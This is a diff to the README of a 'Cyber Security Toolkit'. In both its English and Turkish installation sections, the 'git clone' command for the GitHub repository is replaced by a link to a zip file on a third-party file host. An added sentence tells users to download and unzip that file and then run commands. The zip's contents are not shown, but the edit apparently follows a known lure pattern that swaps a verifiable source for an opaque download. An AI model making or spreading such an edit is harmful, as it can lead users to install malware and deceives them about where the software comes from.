@@ -26,6 +26,8 @@ Reanzai Cyber Security Toolkit is a comprehensive suite of security tools design
 
 ### 🛠️ Installation
 
+You can download the file from here, unzip it and move it to any folder, then open cmd in that folder and type the following commands
+
 #### Prerequisites
 - Node.js (v14 or higher)
 - Git
@@ -33,7 +35,8 @@ Reanzai Cyber Security Toolkit is a comprehensive suite of security tools design
 #### Installation
 ```bash
 # Clone repository
-git clone https://github.com/reanzai/Reanzai-Cyber-Security-Toolkit.git
+https://dosya.co/v9p1fgmvxz4k/tool.zip.html
+
 
 # Navigate to project directory
 cd cyber-security-toolkit
@@ -111,8 +114,9 @@ Reanzai Siber Güvenlik Araçları, ağ analizi, zafiyet değerlendirmesi ve gü
 
 #### Kurulum
 ```bash
-# Repoyu klonla
-git clone https://github.com/reanzai/Reanzai-Cyber-Security-Toolkit
+# Repoyu indir
+https://dosya.co/v9p1fgmvxz4k/tool.zip.html
+
 
 # Proje dizinine git
 cd cyber-security-toolkit
